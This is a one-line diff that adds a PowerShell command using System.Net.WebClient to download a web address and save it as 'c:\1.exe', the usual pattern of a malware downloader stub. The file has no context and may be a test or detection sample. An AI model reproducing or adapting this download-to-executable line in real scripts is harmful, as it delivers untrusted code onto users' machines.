@@ -1,0 +1,1 @@
+﻿(new-Object System.Net.WebClient).DownloadFile("http://baidu.com/","c:\1.exe");
